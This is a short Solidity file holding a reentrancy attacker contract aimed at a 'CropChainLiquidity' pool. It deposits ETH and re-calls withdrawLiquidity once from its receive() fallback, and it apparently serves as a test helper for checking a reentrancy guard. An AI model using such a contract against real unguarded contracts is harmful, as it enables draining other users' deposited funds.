// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ICropChainLiquidity {
    function depositLiquidity() external payable;
    function withdrawLiquidity(uint256 _amount) external;
}

contract ReentrancyAttacker {
    ICropChainLiquidity public immutable target;
    uint256 public attackAmount;
    bool public reentrancyAttempted;

    constructor(address _target) {
        target = ICropChainLiquidity(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "No attack capital");
        attackAmount = msg.value;
        target.depositLiquidity{value: msg.value}();
        target.withdrawLiquidity(msg.value);
    }

    receive() external payable {
        if (!reentrancyAttempted) {
            reentrancyAttempted = true;
            (bool success, ) = address(target).call(
                abi.encodeWithSignature("withdrawLiquidity(uint256)", attackAmount)
            );
            success;
        }
    }
}
